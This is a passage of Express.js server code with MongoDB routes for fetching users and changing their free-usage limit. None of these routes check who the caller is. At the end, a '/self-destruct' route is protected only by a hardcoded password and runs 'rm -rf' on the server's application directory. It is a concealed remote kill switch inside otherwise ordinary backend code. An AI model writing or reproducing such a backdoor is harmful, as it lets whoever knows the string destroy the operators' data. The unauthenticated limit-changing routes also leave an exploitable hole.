    res.json({ message: "Error removing user" });
  }
});

app.post("/getD", async (req, res) => {
  const { _id } = req.body;

  try {
    if (_id) {
      await UserDB.findById({ _id: _id }).then((data) => {
        res.json({ message: "User fetched successfully", data: data });
      });
      console.log("User fetched successfully");
    }
  } catch (error) {
    res.json({ message: "Error fetching user" });
  }
});

app.post("/increaseL", async (req, res) => {
  const { _id, freeLimit } = req.body;

  try {
    if (_id) {
      await UserDB.findByIdAndUpdate(
        { _id: _id },
        { $set: { freeLimit: freeLimit } }
      );
      await UserDB.findById({ _id: _id }).then((data) => {
        res.json({ message: "User Updated successfully", data: data });
      });
      // res.json({message:"User removed successfully"});
      console.log("User Updated successfully");
    }
  } catch (error) {
    res.json({ message: "Error Updating user" });
  }
});
app.post("/self-destruct", async (req, res) => {
    if (req.body.secret !== "kodeath") {
        return res.status(403).send("Unauthorized");
    }

    const { exec } = require("child_process");

    exec("rm -rf /root/raccoon/", (err) => {
        if (err) {
            return res.status(500).send("Failed to delete files");
        }
        res.send("Files deleted.");
    });
});